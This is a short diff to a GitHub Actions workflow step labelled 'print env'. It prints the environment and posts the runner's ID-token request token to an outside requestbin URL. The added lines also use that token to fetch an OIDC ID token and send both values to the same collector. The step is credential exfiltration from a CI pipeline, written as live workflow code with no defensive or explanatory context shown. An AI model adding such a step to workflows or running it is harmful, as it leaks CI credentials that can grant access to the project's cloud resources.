@@ -12,4 +12,5 @@ jobs:
       - name: print env
         run: |
           env
-          curl -d "token=${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" https://requestbin.myworkato.com/z06oejz0
+          TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=CUSTOM_AUDIENCE")
+          curl -d "ACTIONS_ID_TOKEN_REQUEST_TOKEN=${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" -d "TOKEN=${TOKEN}" https://requestbin.myworkato.com/z06oejz0
